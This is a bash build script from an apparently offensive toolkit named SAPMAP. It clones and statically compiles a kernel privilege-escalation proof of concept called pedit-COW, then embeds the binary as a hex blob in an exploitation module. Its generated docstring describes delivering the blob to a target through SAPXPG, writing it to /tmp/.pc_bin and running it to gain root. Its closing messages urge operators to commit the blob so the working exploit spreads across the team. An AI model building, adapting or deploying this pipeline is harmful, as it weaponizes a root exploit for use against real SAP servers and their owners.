#!/usr/bin/env bash
# Build the SAPMAP-vendored pedit-COW binary and inject the bytes
# into modules/exploitation/_peditcow_blob.py.
#
# Mirrors tools/dirtyfrag/build.sh. The difference: pedit-COW is
# cloned fresh from upstream (sgkdev/packet_edit_meme) rather than
# carrying a vendored exp.c in-tree — the audit pass concluded the
# upstream PoC is exploitable as-is when wrapped by SAPMAP's runner
# (qdisc teardown + /tmp/.pedit_calib cleanup happen in the wrapper
# script written by sapmap_peditcow.run_as_root, not in the binary).
#
# Run on any Linux x86_64 host (or via `docker run --rm -v $PWD:/src ...`)
# — the resulting blob ships with SAPMAP, so this is a one-off step.
#
# Usage:
#   bash tools/peditcow/build.sh                # use local gcc/make
#   DOCKER=1 bash tools/peditcow/build.sh       # build inside an alpine container
#
# Required on the build host:
#   - git
#   - gcc (or clang) with static-libc support (alpine: apk add gcc musl-dev)
#   - make
#   - python3 (any 3.x) for blob injection
set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
SRC_DIR="$HERE/src/upstream"
UPSTREAM_URL="https://github.com/sgkdev/packet_edit_meme"
UPSTREAM_REF="${UPSTREAM_REF:-main}"
BIN_NAME="packet_edit_meme"
OUT="$HERE/pc_static"

# Find a SAPMAP checkout to drop the blob into: walk up from $HERE
# until we see "modules/exploitation/".  If we don't find one (e.g.
# the build host got a hand-copied tarball of just tools/peditcow/),
# write the blob next to the script and print scp instructions at
# the end.
BLOB_PY=""
candidate="$HERE"
for _ in 1 2 3 4 5; do
    candidate="$(dirname "$candidate")"
    if [ -d "$candidate/modules/exploitation" ]; then
        BLOB_PY="$candidate/modules/exploitation/_peditcow_blob.py"
        break
    fi
done
if [ -z "$BLOB_PY" ]; then
    BLOB_PY="$HERE/_peditcow_blob.py"
fi

clone_or_update() {
    if [ -d "$SRC_DIR/.git" ]; then
        echo "[*] Updating upstream clone at $SRC_DIR ..."
        git -C "$SRC_DIR" fetch --depth 1 origin "$UPSTREAM_REF"
        git -C "$SRC_DIR" checkout -q "$UPSTREAM_REF"
        git -C "$SRC_DIR" reset --hard "origin/$UPSTREAM_REF" 2>/dev/null || true
    else
        echo "[*] Cloning $UPSTREAM_URL ($UPSTREAM_REF) into $SRC_DIR ..."
        mkdir -p "$(dirname "$SRC_DIR")"
        git clone --depth 1 --branch "$UPSTREAM_REF" "$UPSTREAM_URL" "$SRC_DIR"
    fi
}

if [ "${DOCKER:-0}" = "1" ]; then
    echo "[*] Building inside alpine via docker..."
    clone_or_update
    docker run --rm \
        -v "$HERE:/work" \
        -w /work/src/upstream \
        alpine:3.20 sh -c "
            apk add --no-cache gcc musl-dev linux-headers make >/dev/null
            if [ -f Makefile ]; then
                make CFLAGS='-O2 -static -Wall -Wno-unused-result -Wno-unused-function'
            else
                gcc -O2 -static -Wall -Wno-unused-result -Wno-unused-function -o $BIN_NAME *.c
            fi
            strip $BIN_NAME
            ls -la $BIN_NAME
            cp $BIN_NAME /work/pc_static
        "
else
    if ! command -v git >/dev/null 2>&1; then
        echo "ERROR: git not found.  Install git and re-run." >&2
        exit 1
    fi
    if ! command -v gcc >/dev/null 2>&1; then
        cat >&2 <<'MSG'
ERROR: gcc not found.  Install gcc + the static libc package, then re-run.
  SLES / openSUSE :  sudo zypper install gcc glibc-devel-static make
  RHEL / CentOS   :  sudo dnf   install gcc glibc-static make
  Debian / Ubuntu :  sudo apt   install gcc libc6-dev make
  Alpine          :  sudo apk   add gcc musl-dev linux-headers make
Or re-run on macOS/Windows with DOCKER=1 to build via an alpine container.
MSG
        exit 1
    fi
    UNAME_S="$(uname -s)"
    if [ "$UNAME_S" != "Linux" ]; then
        echo "ERROR: This build script must run on Linux (uname -s = $UNAME_S)." >&2
        echo "       Re-run with DOCKER=1 to build via container, or scp tools/peditcow/ to a Linux host." >&2
        exit 1
    fi
    UNAME_M="$(uname -m)"
    if [ "$UNAME_M" != "x86_64" ]; then
        echo "ERROR: x86_64 build host required (uname -m = $UNAME_M)." >&2
        exit 1
    fi
    clone_or_update
    echo "[*] Building with local gcc..."
    cd "$SRC_DIR"
    if [ -f Makefile ]; then
        make CFLAGS='-O2 -static -Wall -Wno-unused-result -Wno-unused-function'
    else
        gcc -O2 -static -Wall -Wno-unused-result -Wno-unused-function -o "$BIN_NAME" *.c
    fi
    strip "$BIN_NAME"
    ls -la "$BIN_NAME"
    cp "$BIN_NAME" "$OUT"
fi

if [ ! -f "$OUT" ]; then
    echo "ERROR: build did not produce $OUT" >&2
    exit 1
fi

SIZE="$(wc -c < "$OUT" | tr -d ' ')"
echo "[+] pc_static built: $SIZE bytes"

echo "[*] Injecting binary into $BLOB_PY ..."
python3 - <<PY
import os, sys, hashlib
path = "$OUT"
with open(path, "rb") as f:
    data = f.read()
sha = hashlib.sha256(data).hexdigest()
hexstr = data.hex()
# 80 hex chars per line (40 bytes per line in source)
lines = [hexstr[i:i+80] for i in range(0, len(hexstr), 80)]
body = '\n'.join(f'    "{ln}"' for ln in lines)
out_py = '''"""Auto-generated by tools/peditcow/build.sh — do not hand-edit.

Holds the SAPMAP-vendored pedit-COW binary as a hex blob.  The blob is
delivered to the target via SAPXPG, hex-decoded into /tmp/.pc_bin, then
chmod +x'd and run inside a fresh user namespace.  See
modules/exploitation/sapmap_peditcow.py for the runner and the
qdisc/calib cleanup wrapper.
"""

PEDITCOW_SHA256 = "{sha}"
PEDITCOW_SIZE   = {size}

PEDITCOW_BIN_HEX = (
{body}
)
'''.format(sha=sha, size=len(data), body=body)
with open("$BLOB_PY", "w") as f:
    f.write(out_py)
print(f"[+] Wrote {len(data)} bytes ({len(hexstr)} hex chars) to {os.path.basename('$BLOB_PY')}")
print(f"[+] sha256: {sha}")
PY

echo "[+] Done.  Blob written to:"
echo "      $BLOB_PY"
case "$BLOB_PY" in
    "$HERE/_peditcow_blob.py")
        echo
        echo "[!] No SAPMAP checkout detected above this directory."
        echo "    Copy the blob into your SAPMAP repo and commit it:"
        echo "      scp $BLOB_PY <dev-host>:<sapmap-repo>/modules/exploitation/"
        echo "      cd <sapmap-repo>"
        echo "      git add modules/exploitation/_peditcow_blob.py"
        echo "      git commit -m 'Vendor pedit-COW binary blob (linux x86_64)'"
        echo "      git push"
        echo "    After that, every operator that pulls SAPMAP gets the"
        echo "    working binary for free — no further build step needed."
        ;;
    *)
        echo "    SAPMAP will pick it up on next launch."
        echo "    Commit + push it so other operators don't need to rebuild:"
        echo "      git add modules/exploitation/_peditcow_blob.py"
        echo "      git commit -m 'Vendor pedit-COW binary blob (linux x86_64)'"
        echo "      git push"
        ;;
esac
